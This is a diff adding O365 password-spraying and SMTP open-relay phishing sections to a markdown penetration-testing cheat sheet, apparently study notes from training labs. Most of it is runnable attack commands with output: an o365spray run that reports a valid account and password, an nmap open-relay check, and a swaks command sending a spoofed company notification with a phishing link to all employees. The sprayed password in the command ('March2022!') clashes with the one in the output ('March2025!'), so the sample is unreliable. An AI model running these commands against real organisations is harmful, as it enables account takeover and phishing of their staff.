@@ -2890,6 +2890,110 @@ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 <details>
 <summary><h3>O365 Spray - Password Spraying</h3></summary>
 
+```bash 
+python3 o365spray.py --spray -U <USERNAME_LIST> -p '<PASSWORD>' --count 1 --lockout 1 --domain <DOMAIN>
+```
+```bash 
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+
+#             *** O365 Spray ***            
+
+# >----------------------------------------<
+
+#    > version        :  2.0.4
+#    > domain         :  msplaintext.xyz
+#    > spray          :  True
+#    > password       :  March2022!
+#    > userfile       :  usersfound.txt
+#    > count          :  1 passwords/spray
+#    > lockout        :  1.0 minutes
+#    > spray_module   :  oauth2
+#    > rate           :  10 threads
+#    > safe           :  10 locked accounts
+#    > timeout        :  25 seconds
+#    > start          :  2025-04-14 12:26:31
+
+# >----------------------------------------<
+
+# [2025-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
+# [2025-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
+# [2025-04-14 12:26:32,202] INFO : Running password spray against 2 users.
+# [2025-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2025!']
+# [2025-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2025!
+# [2025-04-14 12:26:33,048] INFO : 
+
+# [ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2504141226.txt'
+# [ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2504141226.txt'
+
+# [2025-04-14 12:26:33,048] INFO : Valid Credentials: 1
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h2>Protocol Specific Attacks</h2></summary>
+
+An open relay is a Simple Mail Transfer Protocol (**SMTP**) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.
+
+<details>
+<summary><h2>Open Relay</h2></summary>
+
+From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the nmap smtp-open-relay script, we can identify if an SMTP port allows an open relay.
+
+```bash 
+nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
+```
+```bash 
+# Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
+# Nmap scan report for <TARGET_IP>
+# Host is up (0.28s latency).
+
+# PORT   STATE SERVICE
+# 25/tcp open  smtp
+# |_smtp-open-relay: Server is an open relay (14/16 tests)
+```
+
+Next, we can use any mail client to connect to the mail server and send our email.
+
+```bash 
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
+```
+```bash 
+# === Trying 10.10.11.213:25...
+# === Connected to 10.10.11.213.
+# <-  220 mail.localdomain SMTP Mailer ready
+#  -> EHLO parrot
+# <-  250-mail.localdomain
+# <-  250-SIZE 33554432
+# <-  250-8BITMIME
+# <-  250-STARTTLS
+# <-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
+# <-  250 HELP
+#  -> MAIL FROM:<notifications@inlanefreight.com>
+# <-  250 OK
+#  -> RCPT TO:<employees@inlanefreight.com>
+# <-  250 OK
+#  -> DATA
+# <-  354 End data with <CR><LF>.<CR><LF>
+#  -> Date: Thu, 29 Oct 2020 01:36:06 -0400
+#  -> To: employees@inlanefreight.com
+#  -> From: notifications@inlanefreight.com
+#  -> Subject: Company Notification
+#  -> Message-Id: <20201029013606.775675@parrot>
+#  -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+#  -> 
+#  -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
+#  -> 
+#  -> 
+#  -> .
+# <-  250 OK
+#  -> QUIT
+# <-  221 Bye
+# === Connection closed with remote host.
+```
+
 </details>
 
 </details>
